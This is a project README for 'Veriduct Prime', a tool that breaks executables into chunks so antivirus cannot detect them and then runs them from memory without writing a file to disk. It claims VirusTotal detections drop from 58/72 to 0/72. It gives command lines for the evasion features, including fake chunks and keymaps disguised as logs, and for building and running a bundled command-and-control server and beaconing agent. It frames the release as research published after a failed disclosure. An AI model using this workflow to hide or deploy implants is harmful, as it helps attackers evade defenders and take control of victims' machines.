# Veriduct Prime

**Format Destruction Framework for Binary Evasion**

```
     ┌─────────────────┐                    ┌─────────────────┐
     │   EXECUTABLE    │                    │   C H U N K S   │
     │   ┌─────────┐   │                    │ ╔═══╗ ╔═══╗ ╔═══╗│
     │   │  PE/ELF │   │    ANNIHILATE      │ ║ 1 ║ ║ 2 ║ ║ 3 ║│
     │   │ HEADERS │   │  ═══════════════►  │ ╚═══╝ ╚═══╝ ╚═══╝│
     │   ├─────────┤   │                    │ ╔═══╗ ╔═══╗ ╔═══╗│
     │   │ IMPORTS │   │    58 → 0 → 58     │ ║ 4 ║ ║ 5 ║ ║ 6 ║│
     │   ├─────────┤   │                    │ ╚═══╝ ╚═══╝ ╚═══╝│
     │   │  CODE   │   │    detections      │ ╔═══╗ ╔═══╗ ╔═══╗│
     │   ├─────────┤   │                    │ ║ 7 ║ ║ 8 ║ ║...║│
     │   │  DATA   │   │                    │ ╚═══╝ ╚═══╝ ╚═══╝│
     │   └─────────┘   │                    │                 │
     └─────────────────┘                    └─────────────────┘
            ▲                                       │
            │         REASSEMBLE                    │
            │  ◄═══════════════════════════════════ │
            │        BYTE-PERFECT                   │
            │        HASH MATCH                     ▼
            │                               ┌───────────────┐
            │                               │  SEMANTIC     │
            │                               │  EXECUTION    │
            │       RUN FROM MEMORY         │               │
            └══════════════════════════════ │  No file on   │
                    WITHOUT FILE            │  disk. Ever.  │
                                            └───────────────┘
```

## The Breakthrough

**Files don't need to exist to execute.**

Veriduct Prime destroys binary file formats into unrecognizable chunks, then executes them semantically from memory without ever reconstructing the file on disk. Security tools can't detect what doesn't exist.

```
┌────────────────────────────────────────────────────────────────────────┐
│                    DETERMINISTIC VERIFICATION                          │
├────────────────────────────────────────────────────────────────────────┤
│                                                                        │
│   Original:     agent.exe → VirusTotal → 58/72 DETECTIONS              │
│                      │                                                 │
│                      ▼                                                 │
│   Annihilate:   1,674 chunks → VirusTotal → 0/72 DETECTIONS            │
│                      │                                                 │
│                      ▼                                                 │
│   Reassemble:   agent.exe → VirusTotal → 58/72 DETECTIONS              │
│                      │                                                 │
│                      ▼                                                 │
│   Verify:       SHA256 MATCH ✓ (byte-perfect reconstruction)           │
│                                                                        │
└────────────────────────────────────────────────────────────────────────┘
```

## What This Is

**Format destruction** — not encryption, not packing, not obfuscation.

| Technique | What it does | Can reconstruct? | Detectable pattern? |
|-----------|--------------|------------------|---------------------|
| Encryption | Transforms content | Yes, with key | Entropy analysis |
| Packing | Compresses + stub | Yes, at runtime | Packer signatures |
| Obfuscation | Transforms code | No (lossy) | Heuristic patterns |
| **Veriduct** | **Destroys format** | **Yes, perfectly** | **No file exists** |

The file structure itself is annihilated.

## Test Results

**Production Validation: 75% Test Battery Pass Rate**

| Test | Status | What It Proves |
|------|--------|----------------|
| `minimal_console` | ✅ PASS | Basic CRT, console I/O |
| `static_linked` | ✅ PASS | 64KB binary, zero DLL dependencies |
| `multithreaded` | ✅ PASS | Threading, TLS callbacks, sync |
| `file_operations` | ✅ PASS | Filesystem access, CRT stdio |
| `network_test` | ✅ PASS | Winsock initialization, networking |
| `crypto_test` | ✅ PASS | CryptoAPI, ADVAPI32.dll |
| `windows_api` | ❌ Expected | GUI MessageBox (known limitation) |
| `dll_test` | ❌ Expected | DLL standalone exec (by design) |

**Real-World Validation: C2 Agent**

```
Binary:         veriduct_agent.exe (78 KB)
Chunks:         1,674 (format destroyed)
DLLs Loaded:    13 (KERNEL32, WININET, WS2_32, ADVAPI32, ...)
Imports:        77 functions resolved
Features:       Network beaconing ✓, Command execution ✓, File I/O ✓
Crashes:        0
```

## Quick Start

```bash
# Clone
git clone https://github.com/bombadil-systems/veriduct-prime.git
cd veriduct-prime

# Install dependencies
pip install -r requirements.txt

# Annihilate a binary
python src/veriduct_prime.py annihilate target.exe output/ --ssm --verbose

# Run from chunks (semantic execution)
python src/veriduct_prime.py run output/veriduct_key.zst --verbose

# Or reassemble to verify integrity
python src/veriduct_prime.py reassemble output/veriduct_key.zst rebuilt/
sha256sum target.exe rebuilt/target.exe  # Identical hashes
```

See [QUICKSTART.md](QUICKSTART.md) for detailed examples.

## How It Works

### 1. Annihilation
```
Binary → Chunking → [Optional: SSM + Entanglement] → Chunks DB + Keymap
```
- File is split into 4KB chunks (configurable)
- Optional Semantic Shatter Mapping (SSM) permutes bytes within chunks
- Optional XOR Entanglement makes chunks interdependent
- Chunks stored in SQLite, keymap contains reconstruction metadata
- HMAC integrity verification prevents tampering

### 2. Semantic Execution
```
Keymap → Stream Chunks → Native Loader → Memory Execution
```
- No file written to disk at any point
- Native PE/ELF loader handles:
  - Section mapping with correct memory protections
  - Base relocations (ASLR support)
  - Import table resolution (IAT patching)
  - TLS callbacks
  - SEH registration (64-bit)
  - Delay-load imports
- Entry point called directly in memory

### 3. Reconstruction (Optional)
```
Keymap + Chunks → Original Binary (byte-perfect)
```
- SHA256 hash verification confirms integrity
- Proves deterministic: 58 detections → 0 → 58

## Native Loader Capabilities

### Windows PE (97% Complete) — Production Ready
- ✅ Section mapping with memory protections
- ✅ Base relocation (IMAGE_REL_BASED_HIGHLOW, DIR64)
- ✅ Import resolution (77+ imports validated)
- ✅ Delay-load imports
- ✅ TLS callbacks
- ✅ SEH registration (RtlAddFunctionTable)
- ✅ DLL dependency loading

### Linux ELF (85% Complete) — Functional with Limitations
- ✅ Program header loading
- ✅ Dynamic linking (GOT/PLT)
- ✅ RELA/REL relocations
- ⚠️ Stack initialization incomplete (use `reassemble` for ELF)

See [KNOWN_LIMITATIONS.md](KNOWN_LIMITATIONS.md) for details.

## Advanced Features

```bash
# Semantic Shatter Mapping - byte-level permutation within chunks
python src/veriduct_prime.py annihilate binary.exe out/ --ssm

# XOR Entanglement - chunks depend on each other
python src/veriduct_prime.py annihilate binary.exe out/ --entanglement

# Substrate Poisoning - add fake chunks to confuse analysis
python src/veriduct_prime.py annihilate binary.exe out/ --fake-chunks

# Variable chunking with jitter
python src/veriduct_prime.py annihilate binary.exe out/ --variable-chunks --chunk-jitter 0.3

# Disguised keymap (hide as CSV/log/config)
python src/veriduct_prime.py annihilate binary.exe out/ --disguise csv

# All features combined
python src/veriduct_prime.py annihilate binary.exe out/ \
    --ssm --entanglement --fake-chunks --disguise log --verbose
```

## C2 System

Veriduct includes a working command-and-control system demonstrating operational capability:

```bash
# Start C2 server
python c2/veriduct_c2_server.py

# Compile agent (Windows)
cl.exe /O2 c2/veriduct_agent.c /Fe:agent.exe ws2_32.lib wininet.lib

# Annihilate and run
python src/veriduct_prime.py annihilate agent.exe chunks/ --ssm
python src/veriduct_prime.py run chunks/veriduct_key.zst
```

The agent demonstrates: HTTP beaconing, command execution, file transfer, jittered timing. See [c2/README.md](c2/README.md).

## Why This Exists

**12 months of attempted responsible disclosure. Zero meaningful responses.**

The security industry evaluated this capability and chose silence over engagement.

When novel research is systematically ignored based on credentials rather than technical merit, public release becomes the only path to peer review.

**This is that peer review.**

## Documentation

| Document | Description |
|----------|-------------|
| [QUICKSTART.md](QUICKSTART.md) | Get running in 5 minutes |
| [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) | Technical deep-dive |
| [docs/API.md](docs/API.md) | Complete API reference |
| [docs/ADVANCED.md](docs/ADVANCED.md) | SSM, entanglement, poisoning |
| [KNOWN_LIMITATIONS.md](KNOWN_LIMITATIONS.md) | What doesn't work (yet) |
| [DISCLOSURE.md](DISCLOSURE.md) | 12-month disclosure timeline |
| [CONTRIBUTING.md](CONTRIBUTING.md) | How to contribute |

## Requirements

- Python 3.8+
- Windows 10/11 (for PE execution) or Linux (for ELF)
- Dependencies: `zstandard` (optional, falls back to zlib)

## Legal

This tool is intended for authorized security testing, research, and education. Users are responsible for ensuring compliance with applicable laws and obtaining proper authorization before use.

**MIT License** — See [LICENSE](LICENSE)

## Author

**Chris @ Bombadil Systems LLC**
- Website: [bombadil.systems](https://bombadil.systems)
- Veriduct: [veriduct.com](https://veriduct.com)
- Research: research@bombadil.systems

---
